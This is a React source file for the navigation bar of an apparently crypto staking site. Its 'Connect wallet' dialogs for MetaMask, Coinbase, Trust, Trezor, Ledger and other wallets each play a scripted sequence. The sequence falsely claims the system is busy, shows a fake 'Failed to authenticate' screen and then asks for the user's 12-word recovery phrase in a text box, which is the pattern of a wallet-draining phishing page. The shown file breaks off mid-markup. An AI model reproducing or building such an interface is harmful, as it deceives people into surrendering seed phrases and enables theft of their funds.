import { Link } from "react-router-dom";
import logo from "@/assets/icons/Vector.png"
import Container from "@/SectionComs/Container/Container";
import { Button } from "@/components/ui/button";
import { IoMenu, IoClose } from "react-icons/io5";
import { useEffect, useState } from "react";
import icon1 from "@/assets/icons/vector1.png"
import icon2 from "@/assets/icons/Box.png"
import icon3 from "@/assets/icons/Logout1.png"
import icon4 from "@/assets/icons/Wallet.png"
import metaMask from "@/assets/wallets/Group1.png"
import coinbase from "@/assets/wallets/Group2.png"
import trust from "@/assets/wallets/Group3.png"
import trezor from "@/assets/wallets/Group4.png"
import ledger from "@/assets/wallets/Group5.png"
import otherWallets from "@/assets/wallets/Group6.png"
import wallet from "@/assets/wallets/wallet.png"
import { IoMdMoon } from "react-icons/io";
import { IoMdSunny } from "react-icons/io";
import { GoQuestion } from "react-icons/go";
import { SlArrowLeft, SlArrowRight } from "react-icons/sl";
import useTheme from "@/components/useTheme";
import walletImg from "@/assets/wallets/lageImg/Frame.png"
import { TfiReload } from "react-icons/tfi";
import { Textarea } from "@/components/ui/textarea";
import metaMaskLage from "@/assets/wallets/lageImg/MetaMask1.png"
import coinbaseLage from "@/assets/wallets/lageImg/coinbase.webp"
import trustLage from "@/assets/wallets/lageImg/trust.png"
import trezorLage from "@/assets/wallets/lageImg/unnamed.png"
import ledgerLage from "@/assets/wallets/lageImg/images.png"
import otherWalletsLage from "@/assets/wallets/Group6.png"
import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import useMetaMask from "@/hooks/useMetaMask";
import useCoinbase from "@/hooks/useCoinbase";
import useTrust from "@/hooks/Trust";
import useTrezor from "@/hooks/Trezor";
import useLedger from "@/hooks/Ledger";
import useOtherWallet from "@/hooks/OtherWallet";

const NavBar = () => {
  const [open, setOpen] = useState(false);
  const [color, setColor] = useState(false);
  const [changeBg, setChangeBg] = useState(false);
  const { theme, handleThemeSwitch } = useTheme();

  const { metaCurrentIndex, handleMetaMaskButton, handleMetaMaskPrevious, handleMetaMaskNext, } = useMetaMask();
  const { coinbaseCurrentIndex, handleCoinbaseButton, handleCoinbasePrevious, handleCoinbaseNext } = useCoinbase();
  const { trustCurrentIndex, handleTrustButton, handleTrustPrevious, handleTrustNext } = useTrust();
  const { trezorCurrentIndex, handleTrezorButton, handleTrezorPrevious, handleTrezorNext } = useTrezor();
  const { ledgerCurrentIndex, handleLedgerButton, handleLedgerPrevious, handleLedgerNext } = useLedger();
  const { otherWalletCurrentIndex, handleOtherWalletButton, handleOtherWalletPrevious, handleOtherWalletNext } = useOtherWallet();

  // Scrolling background color
  if (typeof window !== 'undefined') {
    const changeColor = () => {
      if (window?.scrollY >= 30) {
        setColor(true);
      } else {
        setColor(false);
      }
    };
    window.addEventListener('scroll', changeColor);
  }

  return (
    <div className={color ? 'sticky top-0 z-50 duration-300 bg-[#11121F] dark:bg-[#F2F4F6] bg-opacity-90 text-[#d1d1d1] shadow-md' : 'pt-0 duration-300 bg-[#11121f] dark:bg-[#F2F4F6]'}>
      <Container>
        <div className="w-full top-0 py-3 border-b border-[#1d2030a8] dark:border-none left-0 z-10">
          <div className="md:flex justify-between items-center py-4">
            {/* Large device menu */}
            <div className="flex">
              {/* Logo */}
              <Link className="md:mr-[20px] xl:mr-[90px] 2xl:mr-[120px]">
                <img src={logo} alt="Logo" className="w-[141px]" />
              </Link>

              <div className="hidden md:block">
                <ul className={`md:flex md:items-center md:pb-0 pb-12 bg-[#242541] md:bg-transparent absolute md:static md:z-auto z-[-1px] left-0 w-full md:w-auto md:pl-0 pl-9 transition-all duration-500 ease-linear opacity-0 md:opacity-100 space-y-4 md:space-y-0 border border-[#312956] dark:border-none rounded-[12px] ${open ? 'top-[78px] opacity-100' : 'top-[-490px]'}`}>

                  <li className="flex items-center uppercase bg-gradient-to-r from-[#6F5CE4] to-[#8868EE] py-[10px] rounded-[12px] px-[16px] 2xl:px-[20px]">
                    <Link to="/" className="text-[15px] text-[#fff] font-thin flex items-center">
                      <img src={icon1} alt="Icons" className="mr-2" />
                      Stake
                    </Link>
                  </li>

                  <li className="flex items-center uppercase py-[10px] rounded-[12px] px-4 2xl:px-5 duration-500" title="Coming soon">
                    <Link to="" className="text-[15px] text-[#68699e] flex items-center">
                      <img src={icon2} alt="Icons" className="mr-2" />
                      Myterybox
                    </Link>
                  </li>

                  <li className="flex items-center uppercase py-[10px] rounded-[12px] px-4 2xl:px-5" title="Coming soon">
                    <Link to="" className="text-[15px] text-[#68699e] flex items-center">
                      <img src={icon3} alt="Icons" className="mr-2" />
                      Withdrawals
                    </Link>
                  </li>

                  <li className="flex items-center uppercase py-[10px] rounded-[12px] px-4 2xl:px-5" title="Coming soon">
                    <Link to="" className="text-[15px] text-[#68699e] flex items-center">
                      <img src={icon4} alt="Icons" className="mr-2" />
                      Rewards
                    </Link>
                  </li>

                </ul>
              </div>
            </div>

            {/* Toggle hamburger menu */}
            <div onClick={() => setOpen(!open)} className="text-3xl absolute right-8 top-6 cursor-pointer md:hidden">
              {
                open ? <IoClose className="text-[#404175]" /> : <IoMenu className="text-[#404175]" />
              }
            </div>

            {/* Small device menu */}
            <div className="block md:hidden">
              <ul className={`md:flex md:items-center md:pb-0 pb-12 bg-[#242541] dark:bg-[#35353f] md:bg-transparent absolute md:static md:z-auto z-[-1px] left-0 w-full md:w-auto md:pl-0 pl-9 transition-all duration-500 ease-linear opacity-0 md:opacity-100 space-y-4 md:space-y-0 border border-[#312956] rounded-[12px] ${open ? 'top-[75px] opacity-100' : 'top-[-490px]'}`}>

                <li className="flex items-center uppercase bg-gradient-to-r from-[#6F5CE4] to-[#8868EE] py-[10px] rounded-[12px] px-4 mr-9 md:mr-0 mt-3 md:mt-0" title="Coming soon">
                  <Link to="/" className="text-[15px] text-[#fff] font-thin flex items-center">
                    <img src={icon1} alt="Icons" className="mr-2" />
                    Stake
                  </Link>
                </li>

                <li className="flex items-center uppercase py-[10px] rounded-[12px] px-4 duration-500" title="Coming soon">
                  <Link to="/" className="text-[15px] text-[#68699e] dark:text-[#a5a5a5] flex items-center">
                    <img src={icon2} alt="Icons" className="mr-2" />
                    Myterybox
                  </Link>
                </li>

                <li className="flex items-center uppercase py-[10px] rounded-[12px] px-4" title="Coming soon">
                  <Link to="/" className="text-[15px] text-[#68699e] dark:text-[#a5a5a5] flex items-center">
                    <img src={icon3} alt="Icons" className="mr-2" />
                    Withdrawals
                  </Link>
                </li>

                <li className="flex items-center uppercase py-[10px] rounded-[12px] px-4" title="Coming soon">
                  <Link to="/" className="text-[15px] text-[#68699e] dark:text-[#a5a5a5] flex items-center">
                    <img src={icon4} alt="Icons" className="mr-2" />
                    Rewards
                  </Link>
                </li>

                {/* Small screen dialog box */}
                <div className="flex items-center">
                  <Dialog>
                    <DialogTrigger>
                      <Button className="text-[17px] dark:text-[#ffffff] font-light hover:bg-gradient-to-l px-6">Connect wallet</Button>
                    </DialogTrigger>

                    <DialogContent className={theme === 'dark' ? "bg-[#35353f]" : "bg-gradient-to-b from-[#44266f] via-[#131524] to-[#131524]"}>
                      <DialogHeader>
                        <DialogTitle className="flex justify-between items-center mb-[30px]">
                          {/* Tooltip question icon */}
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <GoQuestion className="text-[22px] text-[#a794be] cursor-help" />
                              </TooltipTrigger>
                              <TooltipContent className="bg-gradient-to-r from-[#44266f] to-[#381f5a] border-none">
                                <p className="text-white">Connect lots of wallet</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>

                          <p className="text-[21px] text-[#ffffff] font-bold">Connect Wallet</p>
                          <IoClose className="text-[25px] text-[#a794be]" />
                        </DialogTitle>

                        <DialogDescription>
                          <div>
                            <div className="space-y-4">
                              {/* meta mask popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  <button className={`flex justify-between items-center rounded-xl px-2 py-3 w-full ${theme === 'dark' ? 'bg-[#464653] border-none' : 'bg-gradient-to-r from-[#6f5ce4] to-[#8768ee] border border-[#6f5ce4] dark:border-none'}`}>
                                    <div className="flex items-center">
                                      <img src={metaMask} alt="Meta Mask" className="w-[35px] mr-3" />
                                      <p className="text-[17px] text-[#FFFFFF]">MetaMask</p>
                                    </div>
                                    <Link to='' className='text-white text-[14px] font-medium bg-[#8f73ee] dark:bg-[#705DE4] px-3 py-[5px] border border-[#8f73ee] dark:border-none rounded-md'>Connect</Link>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
                                              <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect MetaMask...</p>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
                                              <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
                                              </button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <Textarea rows={4} className="mt-2 mb-8" />
                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                            </div>
                                          </CarouselItem>
                                        </CarouselContent>
                                        <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>

                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>

                              {/* Coinbase popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#321b4cbe] to-[#372e6a54] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#42418a50]"}`}>
                                    <img src={coinbase} alt="Meta Mask" className="w-[35px] mr-3" />
                                    <p className="text-[17px] text-[#FFFFFF]">Coinbase Wallet</p>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Coinbase</h3>
                                              <img src={coinbaseLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect Coinbase...</p>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Coinbase</h3>
                                              <img src={coinbaseLage} alt="Image" className="w-[100px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
                                              </button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <Textarea rows={4} className="mt-2 mb-8" />
                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                            </div>
                                          </CarouselItem>
                                        </CarouselContent>

                                        <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>

                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>

                              {/* Trust popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  {/* Trust */}
                                  <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#1d1831] to-[#20203c77] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                    <img src={trust} alt="Meta Mask" className="w-[35px] mr-3" />
                                    <p className="text-[17px] text-[#FFFFFF]">Trust Wallet</p>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Trust</h3>
                                              <img src={trustLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect Trust...</p>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Trust</h3>
                                              <img src={trustLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
                                              </button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <Textarea rows={4} className="mt-2 mb-8" />
                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                            </div>
                                          </CarouselItem>
                                        </CarouselContent>

                                        <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>
                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>

                              {/* Trezor popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  {/* Trezor */}
                                  <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                    <img src={trezor} alt="Meta Mask" className="w-[35px] mr-3" />
                                    <p className="text-[17px] text-[#FFFFFF]">Trezor</p>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
                                              <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect Trezor...</p>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
                                              <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
                                              </button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <Textarea rows={4} className="mt-2 mb-8" />
                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                            </div>
                                          </CarouselItem>
                                        </CarouselContent>

                                        <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>
                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>

                              {/* Leger popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  {/* Ledger */}
                                  <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                    <img src={ledger} alt="Meta Mask" className="w-[35px] mr-3" />
                                    <p className="text-[17px] text-[#FFFFFF]">Ledger</p>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Ledger</h3>
                                              <img src={ledgerLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect Ledger...</p>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Ledger</h3>
                                              <img src={ledgerLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
                                              </button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <Textarea rows={4} className="mt-2 mb-8" />
                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                            </div>
                                          </CarouselItem>
                                        </CarouselContent>

                                        <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>
                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>

                              {/* Other wallet popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  {/* Other Wallet */}
                                  <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                    <img src={otherWallets} alt="Meta Mask" className="w-[35px] mr-3" />
                                    <p className="text-[17px] text-[#FFFFFF]">Other Wallets</p>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Other Wallets</h3>
                                              <img src={otherWalletsLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect Other Wallets...</p>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Other Wallets</h3>
                                              <img src={otherWalletsLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
                                              </button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className="flex justify-center text-center w-0">
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <Textarea rows={4} className="mt-2 mb-8" />
                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                            </div>
                                          </CarouselItem>
                                        </CarouselContent>

                                        <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>
                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>
                            </div>

                            <div className="flex justify-center mt-4">
                              <div className="flex items-center">
                                <img src={wallet} alt="wallet" className="w-[20px] mr-2" />
                                <Link to="/" className="text-[#D3D2FF80] hover:underline">I use different wallet</Link>
                              </div>
                            </div>
                          </div>
                        </DialogDescription>
                      </DialogHeader>
                    </DialogContent>
                  </Dialog>

                  <Button onClick={() => { setChangeBg(!changeBg); handleThemeSwitch(); }} className="ml-3 p-4">
                    {
                      changeBg ? <IoMdSunny className="text-[16px] dark:text-[#ffffff] scale-150 rounded-[20px]" /> :
                        <IoMdMoon className="text-[16px] scale-150 rounded-[20px]" />
                    }
                  </Button>
                </div>
              </ul>
            </div>

            {/* Large device action button and dialog box */}
            <div className="hidden md:block">
              <div className="flex items-center">
                <Dialog>
                  <DialogTrigger>
                    <Button className="text-[17px] dark:text-[#ffffff] font-light hover:bg-gradient-to-l px-6">Connect wallet</Button>
                  </DialogTrigger>

                  <DialogContent className={theme === 'dark' ? "bg-[#35353f]" : "bg-gradient-to-b from-[#44266f] via-[#131524] to-[#131524]"}>
                    <DialogHeader>
                      <DialogTitle className="flex justify-between items-center mb-[30px]">
                        {/* Tooltip question icon */}
                        <TooltipProvider>
                          <Tooltip>
                            <TooltipTrigger asChild>
                              <GoQuestion className="text-[22px] text-[#a794be] cursor-help" />
                            </TooltipTrigger>
                            <TooltipContent className="bg-gradient-to-r from-[#44266f] to-[#381f5a] border-none">
                              <p className="text-white">Connect lots of wallet</p>
                            </TooltipContent>
                          </Tooltip>
                        </TooltipProvider>

                        <p className="text-[21px] text-[#ffffff] font-bold">Connect Wallet</p>
                        <IoClose className="text-[25px] text-[#a794be]" />
                      </DialogTitle>

                      <DialogDescription>
                        <div>
